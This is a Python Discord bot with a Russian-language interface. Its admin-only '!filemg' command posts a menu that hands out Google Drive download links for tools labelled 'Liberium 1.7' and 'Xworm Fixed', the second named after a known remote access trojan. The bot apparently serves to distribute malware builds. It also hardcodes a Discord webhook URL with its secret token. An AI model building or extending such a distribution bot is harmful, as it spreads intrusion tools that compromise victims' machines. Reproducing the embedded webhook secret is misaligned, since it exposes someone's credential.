import discord
from discord.ext import commands
import os
import aiohttp
from discord.ui import Select, View

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

WEBHOOK_URL = "https://discord.com/api/webhooks/1489200212260946031/Vhxw8Hx9_ZpGnVW1glB_Kq1RV3padI9wxSqdZafpzpCqkoXpOD0-Zj11O7EaxhPz0tzs"

def mod_check():
    async def predicate(ctx):
        if ctx.author.guild_permissions.administrator or ctx.author.id == ctx.guild.owner_id:
            return True
        await ctx.send("❌ Нет прав", delete_after=5)
        return False
    return commands.check(predicate)

class FileMGSelect(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Liberium 1.7", description="Нажми чтобы получить ссылку", emoji="📦"),
            discord.SelectOption(label="Xworm Fixed", description="Нажми чтобы получить ссылку", emoji="📦"),
        ]
        super().__init__(placeholder="Выберите инструмент...", options=options)

    async def callback(self, interaction: discord.Interaction):
        links = {
            "Liberium 1.7": "https://drive.google.com/file/d/1IkkHs3s0kdaKNY3AV5lqNQtR3weIhg8V/view?usp=sharing",
            "Xworm Fixed": "https://drive.google.com/file/d/1R0VidZ83_p186TlaCLC1z8wQ46IEMyCs/view",
        }
        selected = self.values[0]
        link = links[selected]
        embed = discord.Embed(
            title=f"📥 {selected}",
            description=f"[**Скачать {selected}**]({link})",
            color=discord.Color.purple()
        )
        embed.set_footer(text="FileMG | by lort")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FileMGView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FileMGSelect())

@bot.event
async def on_ready():
    print(f"Бот запущен: {bot.user}")

@bot.command(name="filemg")
@mod_check()
async def filemg(ctx):
    embed = discord.Embed(
        title="Выберите инструмент из категории",
        description="Выберите вариант в меню ниже, чтобы просмотреть подробную информацию и получить ссылку для скачивания.",
        color=discord.Color.purple()
    )
    embed.set_image(url="https://media.discordapp.net/attachments/1483812220499398717/1489194360854675488/standard_4.gif?ex=69cf87d3&is=69ce3653&hm=238fb907ff1c006165275ad3a542139c8a1dd99ffe7f332e238c0bf5c5daaf52&=")
    embed.set_footer(text="FileMG | by lort")
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
        await webhook.send(embed=embed, view=FileMGView())
    await ctx.message.delete()

bot.run(os.getenv("TOKEN"))